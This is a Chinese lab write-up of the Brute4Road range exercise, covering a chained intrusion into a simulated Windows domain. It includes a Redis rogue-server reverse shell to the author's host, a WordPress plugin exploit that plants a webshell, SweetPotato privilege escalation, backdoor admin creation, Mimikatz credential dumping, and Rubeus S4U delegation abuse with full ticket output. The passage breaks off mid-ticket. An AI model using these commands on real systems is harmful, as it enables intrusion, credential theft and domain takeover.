---
title: "春秋云镜 Brute4Road"
onlyTitle: true
date: 2025-10-14 14:29:32
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8173.jpg
---



## 春秋云镜 Brute4Road

### flag1

fscan扫，为什么我从官网下的fsacn扫了TM一大堆开放端口出来？

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912190917828.png)

不管了直接打redis了

redis-cli -h ip

连上之后，可以尝试config set写一下计划任务，不过是没权限的

`INFO replication`判断当前环境，role:master和#Replication，判断为当前为主从复制环境，且当前为主节点。从节点是role:slaves

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200344553.png)

INFO server，查看一下redis版本

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912200621612.png)

5.0.12，redis 好像4.x和5.x都是能打主从复制rce的，https://github.com/n0b0dyCN/redis-rogue-server

```shell
./redis-rogue-server.py --rhost 39.99.226.56 --lhost 117.72.74.197 --lport 50050
#注意这里不是nc监听的端口，而是任意一个空端口，后面会要求输入reverse ip port，那个才是监听端口
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203811434.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250912203818753.png)

whoami一下，看到是redis权限

转交互式shell：python -c 'import pty;pty.spawn("/bin/bash")'

提权，别用sudo -l，要输入自己的密码，到时候一断环境就崩了

>sudo -l 列出当前用户可以通过 sudo 执行的命令权限

find / -user root -perm -4000 -print 2>/dev/null

查找设置了SUID权限的可执行文件，看到有base64

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103442036.png)

GTFObins显示base64 SUID可以任意文件读

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103526136.png)

find / -name flag找到在/home/redis/flag下有flag01，但是没权限读，刚好用base64读

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103621569.png)

base64 "/home/redis/flag/flag01" | base64 --decode

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014103842886.png)

flag01: flag{66b43ff4-5736-4cd7-9df5-f4af6cd248d0}



### flag2

靶机为centos系统，但是ifconfig和ip addr都不能用，用netstat -an查看网段

可以知道本机为172.22.2.7，网段也就推测为172.22.2.7/24（话说春秋云镜从没遇到过跨C段的说）

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014104232684.png)

尝试直接wget官网的fscan，好像，访问不了github？某种不可言的网络策略吧，从自己服务器下吧

```
cd /tmp
python -m SimpleHTTPServer 8888
# python 2.7
wget http://117.72.74.197:8888/fscan
chmod 777 fscan
./fscan -h 172.22.2.7/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014110750517.png)

```
172.22.2.34 XIAORANG域用户
172.22.2.16 winServer 2016 MySQLServer
172.22.2.3 winServer 2016 DC域控
172.22.2.18 存在匿名ftp 且为WordPress站
172.22.2.7 本机
```

上传gost，代理出来

```sh

./gost -L socks5://:5555?bind=true

gost -L rtcp://:2222/39.99.226.56:22 -F socks5://39.99.226.56:5555
```

额，windows装wpscan耽搁了很久，先装ruby -> rubygem -> wpscan，完事了因为win11没有curl，需要去curl.se/windows下载curl，把libcurl-x64.dll改名为libcurl.dll复制到ruby安装目录的bin下

完事了，开着代理用wpscan要验证tls，加上参数--disable-tls-checks

wpscan --url http://172.22.2.18/ --disable-tls-checks

```sh
C:\Users\Administrator>wpscan --url http://172.22.2.18/ --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://172.22.2.18/ [172.22.2.18]
[+] Started: Tue Oct 14 11:57:22 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.41 (Ubuntu)
 |  - Proxy-Connection: keep-alive
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.22.2.18/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.22.2.18/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.22.2.18/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.22.2.18/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.22.2.18/index.php/feed/, <generator>https://wordpress.org/?v=6.0</generator>
 |  - http://172.22.2.18/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.0</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.22.2.18/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://172.22.2.18/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.22.2.18/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wpcargo
 | Location: http://172.22.2.18/wp-content/plugins/wpcargo/
 | Last Updated: 2025-07-23T01:11:00.000Z
 | [!] The version is out of date, the latest version is 8.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 6.x.x (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:05 <=> (137 / 137) 100.00% Time: 00:00:05

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct 14 11:57:41 2025
[+] Requests Done: 188
[+] Cached Requests: 5
[+] Data Sent: 53.695 KB
[+] Data Received: 22.674 MB
[+] Memory used: 365.301 MB
[+] Elapsed time: 00:00:19
```

WordPress version 6.0 identified (Insecure, released on 2022-05-24).得知有洞，用https://github.com/biulove0x/CVE-2021-25003

```sh
python WpCargo.py -t http://172.22.2.18/
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120336758.png)

看下脚本逻辑，shell路径位于wp-content/wp-conf.php?1=system，密码为2，连接类型为CMDLINUX

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120521312.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120805334.png)

网站根目录wp-config.php下找到数据库账号密码wpuser/WpuserEha8Fgj9

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014120952764.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121131304.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121200675.png)

flag{c757e423-eb44-459c-9c63-7625009910d8}

### flag3

这下面还有奇怪的密码表

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014121240345.png)

拿去爆破MSSQLSERVER 172.22.2.16

```
fscan -h 172.22.2.16 -m mssql -pwdf passwd.txt
```

不知道为什么我的fscan又又又又没扫出来，哦原来导出，蚁剑给我limit默认了20条，得把limit去掉得到全部字典

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122715642.png)

```
sa ElGNkOiC
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014122021148.png)

进来先激活xpcmdshell和另外一个组件

执行就是system域用户

```
C:/Users/Public/SweetPotato.exe -a "whoami"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123131903.png)

创建管理员用户方便操作

```
C:/Users/Public/SweetPotato.exe -a "net user godown qwer1234 /add"
C:/Users/Public/SweetPotato.exe -a "net localgroup administrators godown /add"
```

tmd 账密test/123456一连接说是密码过期了，得上linux rdesktop改下密码，但这不是我刚加的用户吗，重新创建了一个密码复杂一点的就登上了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014123837731.png)

flag03: flag{ae9d7830-0bbc-4a88-91e6-5f2b36b47aca}

### flag4

传mimikatz上去，回到MDUT那个域用户，dump hash，记住一定要在域用户上抓hash而不是自己设置的工作组adminstrator

先尝试dcsync抓域控hash，报错没有dcsync权限

```
C:/Users/Public/SweetPotato.exe -a "C:/Users/godown/Desktop/mimikatz.exe \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit"
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014124733748.png)

再从内存抓hash，从内存抓hash就不用在域用户上抓了，都能访问内存，不过为了方便还是直接甜土豆把

```sh
C:/Users/Public/SweetPotato.exe -a "C:/Users/godown/Desktop/mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
```

找到一个用户，还在DC上，不过这逼密码过期了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014125703911.png)

还有一堆MSSQLSERVER$xx用户，找一个Domain在XIAORANG上的MSSQLSERVER用户

833b7fd6cd241c433efffde59363dbcf

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20251014130259887.png)

上SharpHound收集一波，也是MDUT甜土豆执行

```sh
C:/Users/Public/SweetPotato.exe -a "C:/Users/godown/Desktop/SharpHound.exe -c all"
```

我这收集的老是不能写入压缩包，偷一个X1r0z的

https://exp10it.io/2023/08/chunqiuyunjing-brute4road-writeup/

![202308041539243](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/202308041539243.png)

MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控

```shell
C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:833b7fd6cd241c433efffde59363dbcf /domain:xiaorang.lab /impersonateuser:Administrator /msdsspn:cifs/DC.xiaorang.lab /nowrap /ptt"
```

```powershell
Modifying SweetPotato by Uknow to support webshell
Github: https://github.com/uknowsec/SweetPotato 
SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
[+] Attempting NP impersonation using method PrintSpoofer to launch c:\Windows\System32\cmd.exe
[+] Triggering notification on evil PIPE \\MSSQLSERVER/pipe/15df7aa8-ffd0-4067-89a7-6af1292eb477
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Command : "c:\Windows\System32\cmd.exe" /c C:/Users/Public/Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:833b7fd6cd241c433efffde59363dbcf /domain:xiaorang.lab /impersonateuser:Administrator /msdsspn:cifs/DC.xiaorang.lab /nowrap /ptt 
[+] process with pid: 480 created.

=====================================


   ______        _                      

  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: S4U


[*] Using rc4_hmac hash: 833b7fd6cd241c433efffde59363dbcf

[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'

[*] Using domain controller: 172.22.2.3:88

[+] TGT request successful!

[*] base64(ticket.kirbi):


      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3L/w7tIwm603a9xf7ThZc9Pbdt7AqhmNP/9d0o/sLGJSq8jepmS1Ko7C7PH8l2rjJsoXWAci8lPYRNLvOKSWQFRaH4Ch3wI
xM04eS35tamWiT9pbGczzhCa3b1qECvsEnDWTGA5W8K2Uy3J0fRvQAkPOXoSHUxSX171TG6QKVBQbuVlzJJA6QWhxlAvWKGZuqCJJ9MrlgWdcj2Tvr/Ui88Kr+dCbg8wimgfTbiHwF2ULtl2RRBvBjD5Lwdwx2Ec/IBibts5M9VJahgbXxb6bUyfsZFFiK5iAN0V7VjcQgxWG4iVhPmL41QKYkq2GtdWzwCdsLp8rVqmKZvRfuhMxXTdY67IYtS
SKouMNN/N29KR85Lju/guNsdsv6l9uriYc8e08OTkAVkD3zjZjGjUqaTUYF1EQAQSZr7c+bYa4yU+NN6y8DE8e39LobIIXYNS9SsM0Mj5f/nEY0yv9fCWJI+dk2WuytY9VFezxgINC4nfVBKON7EwtgHO5iYxoQJ5X31r6Gc4MhjYB36y3TgpN/qxTTaYaMH5P6a3OrD6Bg3eJuLgN7/X4LxD7kjSvgveNgx19wgwAu2O6W2un9ldunTrATYMyL
UdQ
A5FHQVvQC1AdsATyMGGCnn1IncCpcUp4Vdvr4F3KHNgjfIJ15ZU4CEDFywzi+5RYBUqYF2fRktIY/9HKi2E9IUyoqZQIQUHAJtr48RiBpmmxGXYFGq8F49MCRsqDWHAcwFyLxCefWm7tSHUo1FM3+kHKp26a16ZKoh1judZ7yqqfePKPPfmCzgXjz3t5n24MFBXY5zf7P43QFaShAzKj6hO/qsOnDf5KcetGlsEeh/OX7y1/UKsLWrtYOq5bsVN
ckbZfsDiQ/bXfA0zoTPZr+fiU2b7ZrsXbXsT9YME43lncCUNteFv6hfPN+RZMvFBbMlxaMj/IzF81XVF4RffYFsJMPWTOcRwhXNuJazraw+nxzaKe0ofiancXYN+4JVqv3inAtwVzMRuhokwT0shfSKUK0+efp7qj/oiwYkt8SZZEK2oEsaRndAevkTxlgsH4AJ8yP5sSfmXlyHT0YlKCnRGlOQ10d8+ZqG+bp2A3eC4cJvmqpYayt9seIXlVnq
DQSVD1B25SL2ZFGd6+qkUVfecQyscN85WgDmQdXuwahOHtkZwb5x+mNdiV84s3Lo4oupCXy/LjJQEQ+8TQCEFhlTEr14OLyq9r/wgDHtTTk6xOjUWDICLqf7ykpIQOJhMKbemwKCbuzWD3OO/NtNw4rCVKqPq2bG1xcUOiyc2Ib6iY4UT0NcigCszlvU2LWlczBtUnOmgJEJ/qVQvPNzMYSc1tL7j3/DXpWruPm9EdZ0gIGLjOlF/r3Gj3lgCDL
ffbUXrBVABVpmwjv+1qOA+U4eggQG03FHcXgzfoVFFn1AJ5rZRzI6bEDF88pVwSdO8ag8o1cQcZOy50UmDz9wdJ7CkFaK4SyjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCXq2gCju8I/SwQlXTqi0cSoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMD
I1MTAxNDA1MjcyOFqmERgPMjAyNTEwMTQxNTI3MjhapxEYDzIwMjUxMDIxMDUyNzI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==



[*] Action: S4U


[*] Building S4U2self request for: 'MSSQLSERVER$@XIAORANG.LAB'

[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)

[*] Sending S4U2self request to 172.22.2.3:88

[+] S4U2self success!

[*] Got a TGS for 'Administrator' to 'MSSQLSERVER$@XIAORANG.LAB'

[*] base64(ticket.kirbi):

      doIF3DCCBdigAwIBBaEDAgEWooIE5DCCBOBhggTcMIIE2KADAgEFoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKOCBKQwggSgoAMCARKhAwIBAqKCBJIEggSOVCc+RAHGy2poS/MyeMPKGumNRsWqGyaZoDQAh4GJtuu8du25LVMhXgeZbcO0v5TTVK5Y3hIjhOS7tQ9/IMIZhGd3WpA6ORhh1V5rja7ad
r
BuVTDEf59WEa9eR1ZfDh9Q9x8XOOv+7cB+/j+cxhjbAGhcWmUz+bgAWOo3D7MJsXgGF/UzZYzxAWxWua3deOf2EvXNnaaCejisM0teT75fgbYylrO1fPPzbdtEeRyWTLBik/r8dwdau4y+I5bDLZrc2ZznYg5WcnFlVXbAboM+xyRUimy42S4H87Jv3lHhQOmywSSRj5WE9KmdN/U9DgIjSFdJHTvczctWgFN/rWV+fbnsqn7KkguFPOssJJ0ch
KVVVJ9dCzQ77YlxWvdLMMoBNYrnke07Gy8v5AEH6QWHI5rcYs5LjSYX/M5XzWnptWgPZdu8orKdA4ac9JizGFD4pXx/+bHHLZ/EwAd3DiUpFXNHoafET7uFgsz3HaXVTFNl5NZaN3NsWnv2j6QjwBoBx2YMLocA57cLNiumSzjVDGnJP5uu4aNC+LpPIFOeqNLbRYFVxtFvPildlhTlnhKXSqJeEPgpIdB4OVG82Q7SjsmF3ccm6vsmjAiyFVa/
cM9CJjVKcbajzC/nRYi4MZkA06nsC862tN0SCmxlo5oy2zOKzak9e6Sx/WAzgB3gB9FcCxkTgz2gp6fuazKEoY30BMDQN9EGoUPICdENvp01Mx99wWJqeq0Pi+xmZmlP7bKXVkGO3cNlXuOGZV+6HLb58VZyCOhaz2i52dgViIaZhyDDOwGPT4UsTCMLW2pO7fd5IsCzbQZJjRWCYWpeCvD1XQWo/Hl/SBvyNVGYKlPvY9YnhCC1hA8FPFWaRWs
NcFZKB0bOjwIY5tDvr25e1bA+3fDCgu3uF3OcMqvQqKkddAUX2XQSc5kXqpHHWIWW6K1Ni0ZewUUBbBmVxRRnQKz3oWeg8ynDBpPnR3Xq3O8uJ10WLLEOQTb8ZAmHs6QLm+VYPrV4jadXmNbLakpg9NI87jBouNzDp84+fOfuw9a+IdxoXSaa3/SAEezuuoVHwXGG/bHMEOBBro8nDgXGyXkglsRLIZc5utoUyr8Pr/P1Aa0P1JAdyRBdXSqfvR
9iRk+ft6jnAw/MC6Eo2rB41/MQ+yNyzAwBmITa6MJE2XJsWvnoUKejV8g+LWDDVvK53yTlIWZX59oysu684t6B1vXIvsPKmDk3h6DSJf+EZtSkMzlKIwrQtDudxghOPu2Znirc9synaRvjRBlYTj4HTsaPSp3VaLOzKI53gUcZKvVRnfokUOMSoiCRJku9sILaG/f6HDG7DxSSBgIyrDCkm1hF/aqkTfVBV+RB320ePT+9zUl0QblWzbOjYZ6Xs
DPH6Og3erfGF5B29BeUKlcj0dEle+PKskmiX7a2wo4+pqpq/mwvYJ8VGKCaJPRUsUfbMZlwOqtjWxyXoPu35EnzgHWT3rJXJI3Xase3IAEwrJZLNb4DeBIsAYrLw5GMAKzK+hykKdnW2ygR/GbDIzdNY22hzKY+I6fmEE95++6ZKsGjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCALOCuqWrla66NLnAtfVmcd
zpWMG2
UCwzr14SxvAsAjmaEOGwxYSUFPUkFORy5MQUKiGjAYoAMCAQqhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBAoQAApREYDzIwMjUxMDE0MDUyNzI4WqYRGA8yMDI1MTAxNDE1MjcyOFqnERgPMjAyNTEwMjEwNTI3MjhaqA4bDFhJQU9SQU5HLkxBQqkZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJA==


[*] Impersonating user 'Administrator' to target SPN 'cifs/DC.xiaorang.lab'

[*] Building S4U2proxy request for service: 'cifs/DC.xiaorang.lab'

[*] Using domain controller: DC.xiaorang.lab (172.22.2.3)

[*] Sending S4U2proxy request to domain controller 172.22.2.3:88

[+] S4U2proxy success!

[*] base64(ticket.kirbi) for SPN 'cifs/DC.xiaorang.lab':


      doIGhjCCBoKgAwIBBaEDAgEWooIFlTCCBZFhggWNMIIFiaADAgEFoQ4bDFhJQU9SQU5HLkxBQqIiMCCgAwIBAqEZMBcbBGNpZnMbD0RDLnhpYW9yYW5nLmxhYqOCBUwwggVIoAMCARKhAwIBBKKCBToEggU27HzDbZY4V3+Z7QsPfDqoTD+loWYbiNrMIRndjrnPJfZeOkbDRavA3wbqEUEdyl8KMlhiBYFFvqLnCsKmuePYOaA7PPmZh
o
w74f2RH5vZILxKoypKsyKifvSfgmgndRSLr/HBrPCWuK7gbwNz3Q59X4KUHmy24+5s9liAA72mduGadO8xajcdaK2rBSku0sg8HF6tdwh929BLvi7Xfoe94a0zIfdi8By437gUL42GPJMw6HwucgvRSznskALk2Yfy/isXnISj6LXfOYzaZ/VTAyRvzLAH+f2l/xWdjjr9w3RqoVGhOPjTGfg0+sXbR4qRrOadCwIERvdeyDhDfmyU5wsxWtpw4
rVv3wZ4t17FJBagVAqr+TwuCbqPhRbTS4wsWFvHwDXHTumxObk+Q+BL7vB5TqgrLwXqP1a72i5eLlZ8/Z06r5v8cBwZzHJFCSXPOJzWLiCu/ZYw1iH9djiJjiV9g7hMSfpz5I7ZEFsu51CXoP12ynKG8b4i+GITwvxvDZsFWLWSUosYG3Ap0gvrP8oTZILzyGIXs2E/2VrAkXSlUkTS8v997xelxilDnP/un2uKvSIsbW1U16M1ODbYp6yaQzLM
5aNLXXwBR+DBhTNEcObMQgzdjKzNArGLEu67+ufruQO/esR0UxrVnQO8Q82cv9fSf6F1nkgcdD2jhcB78Rg8rM6BEK3Fu3EeA/DRkJ0Cqb5FnFYnT+EAeiYCpabuaVejvlMhz0OxCkJZGya28Z3xRamq08YF7Ip0xWJWfJKM99F7z53p5WB2HgAO09T6OI5oyzf2gNHHyLYkf4cHvl3NltVX4Ikqx1soxy4qTbuHyU5gw1L6TcjgGgwLDeV/LNR
Oh5TH3xBT82+3qP00tAs3jUycBrn4oUUMdhPJ8niO/me1FU3nFHCEW8O9rWgsfn6Uh67ZLh3Iej8OhcEnhrKW/b5+WqKF4TyUiyiZoRC5izYN03CPkWaPJk1DQP7vihrtpsOyicG2nHpIVPz44zhc92/rUdH530pdBL9FzIvykF+zc4HDlfKyORfPcyoDZ6BjaC4XPun+pAI1y4wKYfj3rDkWIY4Hp6AdfurR0cco6TmkxD+kvq+W/a00Dsxuw2
sP/Se9/UUhobfNpUT9KXgWXNEbge1oeiJQTzFnF0t8drenBWFMkhqtFqDxGiy9X3ny09ka5ffhHzcJyRuDEj5gBlrLhHRMGb2jFx1auvae53Aq5kyoKfXOFt4ED+Yj0rjijZHmH9mDzqZDu0RqmOZXR9I96m6N41idA3N7j+hMSGcfsL24WViAx6FekgMwHDmUFv5pDsccdvwMEhvOI3WDtOan8Ucvt1ZnCGDcxDjLkQ7S6QrYDYcT2yDssczFu
a8IU2
gPugiS2qlVCHQCByPfXbtB4Wq2ThyTEY3qVRFegWfloPpXAfzLbCDY7H0zenbF6b6oj/wgnLRir3em8tMYit9m70W39IUxa0JZYCXIBmRH2lCYDfy4PXqfZchVydFfy4nqNe0dTclimcOfjcGbF/vvOPFJu+bZXMVoKrXD2CgLp6epi6A8tJhEFsvUOsCOX3j6xNmEJ5suOLNounABWUqj49j3Hz/pGofDEmHydesNlcRrdo0l6Q22NOXpkd5mD
ut3gbTb4Drfi80O2fQEPvonzuZ2GJtpPeP5jjGrGqtE2FY4ZScJoaDPmjQNxQ05nWVBndhfP+OSezZvE6fU1+8aeQMYCyk3+o5I6gcIuUxF36mQU7KKDCRIE4VSWR/fko4KpQ4MG11nyADuhoWVVZSjgdwwgdmgAwIBAKKB0QSBzn2ByzCByKCBxTCBwjCBv6AbMBmgAwIBEaESBBCRe+RR0PS7SyTxMd+X+wRMoQ4bDFhJQU9SQU5HLkxBQqIa
MBigAwIBCqERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEClAAClERgPMjAyNTEwMTQwNTI3MjhaphEYDzIwMjUxMDE0MTUyNzI4WqcRGA8yMDI1MTAyMTA1MjcyOFqoDhsMWElBT1JBTkcuTEFCqSIwIKADAgECoRkwFxsEY2lmcxsPREMueGlhb3JhbmcubGFi

[+] Ticket successfully imported!

[+] Process created, enjoy!

```

注入cifs/DC.xiaorang.lab票据：

```powershell
C:/Users/Public/Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3L/w7tIwm603a9xf7ThZc9Pbdt7AqhmNP/9d0o/sLGJSq8jepmS1Ko7C7PH8l2rjJsoXWAci8lPYRNLvOKSWQFRaH4Ch3wIxM04eS35tamWiT9pbGczzhCa3b1qECvsEnDWTGA5W8K2Uy3J0fRvQAkPOXoSHUxSX171TG6QKVBQbuVlzJJA6QWhxlAvWKGZuqCJJ9MrlgWdcj2Tvr/Ui88Kr+dCbg8wimgfTbiHwF2ULtl2RRBvBjD5Lwdwx2Ec/IBibts5M9VJahgbXxb6bUyfsZFFiK5iAN0V7VjcQgxWG4iVhPmL41QKYkq2GtdWzwCdsLp8rVqmKZvRfuhMxXTdY67IYtSSKouMNN/N29KR85Lju/guNsdsv6l9uriYc8e08OTkAVkD3zjZjGjUqaTUYF1EQAQSZr7c+bYa4yU+NN6y8DE8e39LobIIXYNS9SsM0Mj5f/nEY0yv9fCWJI+dk2WuytY9VFezxgINC4nfVBKON7EwtgHO5iYxoQJ5X31r6Gc4MhjYB36y3TgpN/qxTTaYaMH5P6a3OrD6Bg3eJuLgN7/X4LxD7kjSvgveNgx19wgwAu2O6W2un9ldunTrATYMyLUdQA5FHQVvQC1AdsATyMGGCnn1IncCpcUp4Vdvr4F3KHNgjfIJ15ZU4CEDFywzi+5RYBUqYF2fRktIY/9HKi2E9IUyoqZQIQUHAJtr48RiBpmmxGXYFGq8F49MCRsqDWHAcwFyLxCefWm7tSHUo1FM3+kHKp26a16ZKoh1judZ7yqqfePKPPfmCzgXjz3t5n24MFBXY5zf7P43QFaShAzKj6hO/qsOnDf5KcetGlsEeh/OX7y1/UKsLWrtYOq5bsVNckbZfsDiQ/bXfA0zoTPZr+fiU2b7ZrsXbXsT9YME43lncCUNteFv6hfPN+RZMvFBbMlxaMj/IzF81XVF4RffYFsJMPWTOcRwhXNuJazraw+nxzaKe0ofiancXYN+4JVqv3inAtwVzMRuhokwT0shfSKUK0+efp7qj/oiwYkt8SZZEK2oEsaRndAevkTxlgsH4AJ8yP5sSfmXlyHT0YlKCnRGlOQ10d8+ZqG+bp2A3eC4cJvmqpYayt9seIXlVnqDQSVD1B25SL2ZFGd6+qkUVfecQyscN85WgDmQdXuwahOHtkZwb5x+mNdiV84s3Lo4oupCXy/LjJQEQ+8TQCEFhlTEr14OLyq9r/wgDHtTTk6xOjUWDICLqf7ykpIQOJhMKbemwKCbuzWD3OO/NtNw4rCVKqPq2bG1xcUOiyc2Ib6iY4UT0NcigCszlvU2LWlczBtUnOmgJEJ/qVQvPNzMYSc1tL7j3/DXpWruPm9EdZ0gIGLjOlF/r3Gj3lgCDLffbUXrBVABVpmwjv+1qOA+U4eggQG03FHcXgzfoVFFn1AJ5rZRzI6bEDF88pVwSdO8ag8o1cQcZOy50UmDz9wdJ7CkFaK4SyjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCXq2gCju8I/SwQlXTqi0cSoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MTAxNDA1MjcyOFqmERgPMjAyNTEwMTQxNTI3MjhapxEYDzIwMjUxMDIxMDUyNzI4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nL